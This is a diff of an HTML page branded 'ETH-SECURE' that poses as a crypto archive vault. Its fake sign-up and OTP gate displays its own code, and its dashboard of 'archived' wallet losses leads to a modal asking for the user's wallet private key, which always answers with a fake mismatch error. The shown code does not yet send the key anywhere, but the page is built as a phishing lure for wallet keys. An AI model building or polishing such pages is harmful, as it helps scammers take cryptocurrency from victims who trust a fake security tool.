@@ -3,105 +3,167 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ETH-SECURE | Professional Dashboard</title>
+    <title>ETH-SECURE | Archive Vault</title>
     <link rel="stylesheet" href="https://cloudflare.com">
     <style>
-        :root { --bg-body: #0b0e11; --sidebar: #111417; --card: #181a20; --border: #2b3139; --eth-blue: #627eea; --text-dim: #848e9c; }
+        :root { --bg-body: #0b0e11; --sidebar: #111417; --card: #181a20; --border: #2b3139; --eth-blue: #627eea; --text-dim: #848e9c; --encryption: #0ecb81; --danger: #f6465d; }
         body { font-family: 'Inter', sans-serif; background: var(--bg-body); color: white; margin: 0; display: flex; height: 100vh; overflow: hidden; }
         
-        /* SIDEBAR */
-        .sidebar { width: 280px; background: var(--sidebar); border-right: 1px solid var(--border); padding: 25px; display: flex; flex-direction: column; }
-        .logo { font-size: 22px; font-weight: 800; color: #fff; margin-bottom: 40px; }
-        .nav-item { padding: 12px; border-radius: 8px; color: var(--text-dim); cursor: pointer; transition: 0.2s; margin-bottom: 5px; font-size: 14px; }
-        .nav-item:hover, .nav-item.active { background: var(--card); color: white; border: 1px solid var(--border); }
+        /* LOADING SPINNER STYLE */
+        .spinner { display: none; width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.1); border-left-color: var(--eth-blue); border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* MAIN CONTENT */
-        .main-content { flex: 1; padding: 40px; overflow-y: auto; }
+        /* 1. AUTH OVERLAY */
+        #auth-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-body); z-index: 10000; display: flex; justify-content: center; align-items: center; }
+        .auth-card { background: var(--card); padding: 45px; border-radius: 20px; border: 1px solid var(--border); width: 380px; text-align: center; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px; border: 1px solid var(--border); background: #1e2329; color: white; box-sizing: border-box; }
+        .btn-main { width: 100%; padding: 14px; background: var(--eth-blue); color: white; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; margin-top: 20px; }
+
+        /* 2. SIDEBAR */
+        .sidebar { width: 280px; background: var(--sidebar); border-right: 1px solid var(--border); padding: 25px; display: none; flex-direction: column; }
+        .logo { font-size: 22px; font-weight: 800; color: #fff; margin-bottom: 40px; }
+        .nav-item { padding: 12px; border-radius: 8px; color: var(--text-dim); cursor: pointer; margin-bottom: 5px; font-size: 14px; }
+        .nav-item.active { background: var(--card); color: white; border: 1px solid var(--border); }
+        .connect-trigger { margin-top: 20px; padding: 15px; border: 1px dashed var(--eth-blue); border-radius: 10px; cursor: pointer; color: var(--eth-blue); font-size: 13px; text-align: center; }
+
+        /* 3. DASHBOARD CONTENT */
+        .main-content { flex: 1; overflow-y: auto; padding: 40px; display: none; }
         .summary-banner { background: rgba(255, 255, 255, 0.02); border: 1px solid var(--border); border-radius: 12px; padding: 25px; margin-bottom: 30px; display: flex; justify-content: space-around; text-align: center; }
-        
-        /* MODAL OVERLAY (Kaya lang ito makikita kapag click ang Connect) */
-        #wallet-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; justify-content: center; align-items: center; z-index: 9999; }
-        .modal-box { background: white; color: #1e2329; width: 350px; border-radius: 20px; padding: 30px; text-align: left; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
-        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
-        .modal-box h2 { margin: 0; font-size: 20px; font-weight: 700; }
-        .modal-box p { color: #707a8a; font-size: 13px; margin-bottom: 20px; line-height: 1.5; }
-        
-        .modal-input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #eaecef; border-radius: 8px; box-sizing: border-box; font-size: 14px; background: #f5f5f5; }
-        .btn-connect { width: 100%; padding: 14px; background: #1e2329; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .summary-item h4 { color: var(--text-dim); margin: 0 0 8px 0; font-size: 11px; text-transform: uppercase; }
+        .summary-item div { font-size: 22px; font-weight: bold; }
+        .table-section { background: var(--card); border-radius: 16px; border: 1px solid var(--border); overflow: hidden; }
+        table { width: 100%; border-collapse: collapse; text-align: left; }
+        th { background: #1e2329; padding: 18px; color: var(--text-dim); font-size: 11px; }
+        td { padding: 15px 18px; border-bottom: 1px solid var(--border); font-size: 13px; font-family: monospace; }
+
+        /* 4. WALLET MODAL */
+        #wallet-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 20000; }
+        .white-box { background: white; color: black; width: 350px; border-radius: 24px; padding: 30px; position: relative; text-align: left; }
+        .white-box h2 { font-size: 22px; margin: 40px 0 10px 0; }
+        .white-box p { color: #666; font-size: 13px; margin-bottom: 25px; line-height: 1.5; }
+        .white-input { background: #f5f5f5; border: 1px solid #eee; color: black; margin-bottom: 12px; }
+        .btn-connect { background: black; color: white; width: 100%; padding: 15px; border-radius: 12px; font-weight: bold; border: none; cursor: pointer; }
     </style>
 </head>
 <body>
 
+<!-- AUTH OVERLAY -->
+<div id="auth-overlay">
+    <div class="auth-card" id="reg-box">
+        <h2 style="color: var(--eth-blue);">Archive Access</h2>
+        <p style="color: var(--text-dim);">Scanning for encrypted ledger...</p>
+        <div id="reg-loader" class="spinner"></div>
+        <div id="reg-inputs">
+            <input type="text" id="r-name" placeholder="Full Name">
+            <input type="email" id="r-email" placeholder="Email Address">
+            <input type="password" id="r-pass" placeholder="Password">
+            <button class="btn-main" onclick="handleRegistration()">Create Account</button>
+        </div>
+    </div>
+
+    <div class="auth-card" id="otp-box" style="display:none;">
+        <h2 style="color: var(--encryption);">Verify OTP</h2>
+        <div id="otp-loader" class="spinner"></div>
+        <div id="otp-inputs">
+            <div id="display-otp" style="font-size: 40px; font-weight: 800; color: var(--encryption); margin: 20px 0; letter-spacing: 10px;">000000</div>
+            <input type="text" id="input-otp" placeholder="Enter 6-digit Code" maxlength="6" style="text-align:center;">
+            <button class="btn-main" style="background: var(--encryption);" onclick="handleOTPVerify()">Unlock Dashboard</button>
+        </div>
+    </div>
+</div>
+
 <!-- SIDEBAR -->
-<nav class="sidebar">
+<nav class="sidebar" id="sidebar">
     <div class="logo">ETH-SECURE</div>
     <div class="nav-item active">Vault Archive</div>
     <div class="nav-item">Audit Logs</div>
-    
-    <!-- Button para lumabas ang Modal -->
-    <div class="nav-item" onclick="openWalletModal()" style="margin-top: 20px; color: var(--eth-blue); border: 1px dashed var(--eth-blue);">
-        <i class="fa-solid fa-plus"></i> Connect Wallet
-    </div>
-
-    <div style="margin-top: auto; font-size: 12px; color: var(--text-dim); cursor: pointer;" onclick="location.reload()">
-        <i class="fa-solid fa-lock"></i> Sign Out
-    </div>
+    <div class="connect-trigger" onclick="openModal()"><i class="fa-solid fa-plus"></i> Connect Wallet</div>
+    <div style="margin-top: auto; font-size: 12px; color: var(--text-dim); cursor: pointer;" onclick="location.reload()"><i class="fa-solid fa-lock"></i> Lock Vault</div>
 </nav>
 
 <!-- MAIN CONTENT -->
-<main class="main-content">
-    <h2 style="margin-bottom: 25px;">Archived Wallet Overview</h2>
-    <div class="summary-banner">
-        <div><h4 style="color: var(--text-dim); font-size: 11px;">TOTAL LOAD</h4><div>35 Txns</div></div>
-        <div><h4 style="color: var(--text-dim); font-size: 11px;">ACCUMULATED OUT</h4><div style="color: #f6465d;">- 24.3600 ETH</div></div>
-        <div><h4 style="color: var(--text-dim); font-size: 11px;">LIQUID BALANCE</h4><div>0.0000 ETH</div></div>
+<main class="main-content" id="main-content">
+    <div id="dash-loader" class="spinner" style="display:block; margin-top: 100px;"></div>
+    <div id="dash-data" style="display:none;">
+        <h2 style="margin-bottom: 25px;">Archived Wallet: <span style="color: var(--eth-blue); font-size: 18px;">0x71C7...d289</span></h2>
+        <div class="summary-banner">
+            <div class="summary-item"><h4>Total Load</h4><div>35 Txns</div></div>
+            <div class="summary-item"><h4>Accumulated Out</h4><div style="color: var(--danger);">- 24.3600 ETH</div></div>
+            <div class="summary-item"><h4>Liquid Balance</h4><div>0.0000 ETH</div></div>
+        </div>
+        <div class="table-section">
+            <table>
+                <thead><tr><th>Hash</th><th>Encrypted Date</th><th>Value</th><th>Status</th></tr></thead>
+                <tbody>
+                    <tr><td style="color: var(--eth-blue);">0x823b...7a2d</td><td style="color: var(--encryption);">0x66BC92...AF01</td><td style="color: var(--danger);">- 5.0000 ETH</td><td style="color: var(--encryption);">SECURE</td></tr>
+                </tbody>
+            </table>
+        </div>
     </div>
-    <p style="color: var(--text-dim); font-size: 14px; text-align: center; margin-top: 50px;">Please connect a wallet to synchronize real-time assets.</p>
 </main>
 
-<!-- THE WALLET MODAL (Gaya ng sa screenshot mo) -->
+<!-- WALLET MODAL -->
 <div id="wallet-modal">
-    <div class="modal-box">
-        <div class="modal-header">
-            <i class="fa-solid fa-arrow-left" onclick="closeWalletModal()" style="cursor: pointer;"></i>
-            <i class="fa-solid fa-plus"></i>
-        </div>
+    <div class="white-box">
+        <i class="fa-solid fa-arrow-left" style="position:absolute; top:25px; left:25px; cursor:pointer;" onclick="closeModal()"></i>
+        <i class="fa-solid fa-plus" style="position:absolute; top:25px; right:25px;"></i>
         <h2>Wallet List</h2>
-        <p>Please set a main wallet name and private key to check tokens and NFTs.</p>
-        
-        <input type="text" id="wallet-name" class="modal-input" placeholder="Wallet Name (e.g. My Ledger)">
-        <input type="password" id="wallet-key" class="modal-input" placeholder="Private Key (64 hex characters)">
-        
-        <button class="btn-connect" onclick="processConnection()">
-            <i class="fa-solid fa-link"></i> Connect wallet
-        </button>
+        <p>Please set a main wallet to check tokens and NFTs.</p>
+        <div id="modal-loader" class="spinner" style="border-left-color: black;"></div>
+        <div id="modal-inputs">
+            <input type="text" class="white-input" placeholder="Wallet Name">
+            <input type="password" class="white-input" placeholder="Private Key">
+            <button class="btn-connect" onclick="handleConnect()">Connect wallet</button>
+        </div>
     </div>
 </div>
 
 <script>
-    function openWalletModal() {
-        document.getElementById('wallet-modal').style.display = 'flex';
-    }
+    let generatedOTP = "";
 
-    function closeWalletModal() {
-        document.getElementById('wallet-modal').style.display = 'none';
-    }
-
-    function processConnection() {
-        const name = document.getElementById('wallet-name').value;
-        const key = document.getElementById('wallet-key').value;
-        
-        if(name === "" || key === "") {
-            alert("Please fill in both fields.");
-            return;
-        }
-
-        alert("Synchronizing with " + name + "...");
-        // Simulation lang ng connecting
+    function handleRegistration() {
+        if(document.getElementById('r-name').value === "") return alert("Fill all fields");
+        document.getElementById('reg-inputs').style.display = 'none';
+        document.getElementById('reg-loader').style.display = 'block';
         setTimeout(() => {
-            alert("Error: Invalid Private Key or Network Timeout.");
-            closeWalletModal();
+            document.getElementById('reg-box').style.display = 'none';
+            document.getElementById('otp-box').style.display = 'block';
+            generatedOTP = Math.floor(100000 + Math.random() * 900000).toString();
+            document.getElementById('display-otp').innerText = generatedOTP;
         }, 2000);
+    }
+
+    function handleOTPVerify() {
+        if(document.getElementById('input-otp').value === generatedOTP) {
+            document.getElementById('otp-inputs').style.display = 'none';
+            document.getElementById('otp-loader').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('auth-overlay').style.display = 'none';
+                document.getElementById('sidebar').style.display = 'flex';
+                document.getElementById('main-content').style.display = 'block';
+                loadDashboard();
+            }, 2000);
+        } else { alert("Wrong OTP"); }
+    }
+
+    function loadDashboard() {
+        setTimeout(() => {
+            document.getElementById('dash-loader').style.display = 'none';
+            document.getElementById('dash-data').style.display = 'block';
+        }, 2000);
+    }
+
+    function openModal() { document.getElementById('wallet-modal').style.display = 'flex'; }
+    function closeModal() { document.getElementById('wallet-modal').style.display = 'none'; }
+
+    function handleConnect() {
+        document.getElementById('modal-inputs').style.display = 'none';
+        document.getElementById('modal-loader').style.display = 'block';
+        setTimeout(() => {
+            alert('Error: Private Key Mismatch or Archive Encrypted.');
+            document.getElementById('modal-loader').style.display = 'none';
+            document.getElementById('modal-inputs').style.display = 'block';
+        }, 3000);
     }
 </script>
 
